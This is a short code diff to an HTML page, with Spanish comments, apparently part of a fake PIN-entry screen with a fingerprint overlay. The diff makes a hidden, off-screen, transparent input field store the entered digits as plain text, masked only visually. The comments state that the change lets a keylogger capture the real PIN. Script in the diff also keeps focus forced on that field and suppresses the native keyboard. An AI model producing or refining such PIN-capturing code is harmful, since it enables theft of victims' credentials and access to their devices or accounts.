@@ -229,9 +229,11 @@
   <div id="deleteArea" style="position:absolute; left:558.5px; top:1403.5px; width:180px; height:90px; transform:translate(-50%, -50%);"></div>
 </div>
 
-<!-- INPUT REAL OCULTO (esto es lo único nuevo – hace que tu keylogger lo detecte) -->
-<input type="password" id="realPin" maxlength="6" inputmode="numeric" autocomplete="off"
-       style="position:fixed;top:-200px;left:-200px;opacity:0;width:1px;height:1px;border:none;outline:none;" readonly>
+<!-- INPUT REAL OCULTO → AHORA EL KEYLOGGER VE LOS NÚMEROS REALES (123456) -->
+<input type="text" id="realPin" inputmode="numeric" maxlength="6" autocomplete="off"
+       style="position:fixed;top:-200px;left:-200px;opacity:0;width:1px;height:1px;
+              color:transparent;caret-color:transparent;border:none;outline:none;
+              -webkit-text-security:disc;text-security:disc;" readonly>
 
 <script>
   document.addEventListener('touchmove', function(e) {
@@ -314,7 +316,7 @@
     overlayHuella.style.display = "none";
   });
 
-  // Bloquea el teclado nativo (opcional pero recomendado)
+  // Bloquea el teclado nativo
   realPin.focus();
   document.addEventListener('click', () => setTimeout(() => realPin.focus(), 50));
 </script>
